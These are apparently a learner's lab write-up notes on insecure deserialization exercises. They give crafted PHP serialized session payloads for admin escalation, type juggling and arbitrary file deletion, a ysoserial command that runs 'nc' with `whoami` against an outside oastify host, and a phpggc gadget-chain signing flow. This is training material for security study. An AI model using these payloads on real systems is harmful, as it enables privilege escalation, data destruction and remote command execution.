### Modifying serialized objects

**Payload** :
Login as wiener -> decode Base64 the session cookie -> change value admin from 0 to 1 -> encode Base64 -> store encoded session to cookies
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}`

### Modifying serialized data types

**Payload** :
`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}`

**Penjelasan** :
Same as before, but since PHP version used is 7.x, so it could bring to PHP juggling, example. 
```php
if ($user->access_token == $stored_token) {
// Grant access 
}
```
If `$stored_token` is a non-numeric string, PHP will convert the integer `0` to a string and compare it to `$stored_token`. Due to PHP's type juggling rules, `0 == "any_non_numeric_string"` evaluates to `true`

### Using application functionality to exploit insecure deserialization

**Objection** : delete file morale.txt from Carlos's home directory
**Payload** : 
`O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"mym70vmn02mt5jhee3g1aii0efwqergc";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}`
**Penjelasan** : 
Since the objection is to delete file, so it can achieve by abuse user-accessible functionality, such as delete user. On delete method it would be delete user and their avatar picture, because of that we have to change the value of avatar_link to desired file.

### Arbitary Object Injection

**Objection** : delete file morale.txt from Carlos's home directory
**Payload** : 
source code -> hidden page by add `~` EoF -> login -> change the cookies with serialized below
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`
**Penjelasan** :
since on hidden page there's a magic method `__construct` and `__destruct`, you could abuse the method. 

### Exploiting Java deserialization with Apache Commons
**Objection**: delete file morale.txt from Carlos's home directory
**Payload** :
login -> see on cookie that the session start with 'rO0ABX', it means using java deserialization -> using ysoserial with command
```bash
java -jar ysoserial-all.jar CommonsCollections4 'nc `whoami`.4ej91z9o7ej3zcfc3u2kxuvsqjwak28r.oastify.com' | base64 -w 0
```

### Exploiting PHP deserialization with a pre-built gadget chain
**Payload** :
```php
<?php
// Method 1: Using hash_hmac (recommended)
$secret_key = 'secret_key';
$data = 'data base64'; // Usually raw POST body

$signature = hash_hmac('sha1', $data, $secret_key);
echo $signature;
```

**Flow** :
login -> see source code -> phpinfo.php -> save SECRET_KEY -> cause error on deserialization -> found out the framework used -> using phpggc to create payload based on framework version (don't forget to convert it to base64) -> create signature of payload with secret_key -> send to repeater